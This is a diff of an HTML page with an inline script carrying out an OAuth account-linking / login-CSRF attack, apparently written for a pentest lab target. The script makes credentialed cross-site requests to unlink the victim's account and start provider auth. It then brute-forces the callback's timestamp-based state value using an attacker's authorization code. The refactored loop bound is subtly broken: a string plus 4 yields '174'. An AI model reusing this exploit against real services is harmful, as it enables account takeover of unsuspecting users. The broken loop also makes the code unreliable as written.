@@ -4,17 +4,23 @@
   </head>
   <body>
 <script>
-    function zeroPad(num, size) {
-    num = num.toString();
-    while (num.length < size) num = "0" + num;
-    return num;
-}
+
 
 (async ()=>{
-
+    var client_url = "http://ptl-1801d3a9-e148ea13.libcurl.so"
+    var code = "ec9d64f6ac751c6880fcf2f395f92b523a653e7fe66a5e0788c12263b827267e"
+    var state = "2021080823"
+    var utc_m= "17"
     
+    function zeroPad(num, size) {
+        num = num.toString();
+        while (num.length < size) num = "0" + num;
+        return num;
+    }
+
+
     try {
-        await fetch("http://ptl-70a53532-e23265ca.libcurl.so/unlink", {
+        await fetch(client_url+"/unlink", {
             credentials: 'include'
         })
     }
@@ -23,18 +29,18 @@
     }
 
     try {
-        await fetch("http://ptl-70a53532-e23265ca.libcurl.so/users/auth/myprovider", {
+        await fetch(client_url+"/users/auth/myprovider", {
             credentials: 'include'
         })
     }
     catch(e) {
         console.log("BB"+e);
     }
-    for (let m=03; m<06; m++)
+    for (let m=utc_m; m<utc_m+4; m++)
     {
         for (let s=0;s<60;s++) {
             try {
-                await fetch("http://ptl-70a53532-e23265ca.libcurl.so/users/auth/myprovider/callback?code=195f4eae8f8c0da00f10506fa60670ea7e05da8574443b7c5a93b69b802bad62&state=2021080811"+zeroPad(m,2)+zeroPad(s,2), {
+                await fetch(client_url+"/users/auth/myprovider/callback?code="+code+"&state="+state+zeroPad(m,2)+zeroPad(s,2), {
                     credentials: 'include'
                 })
             }
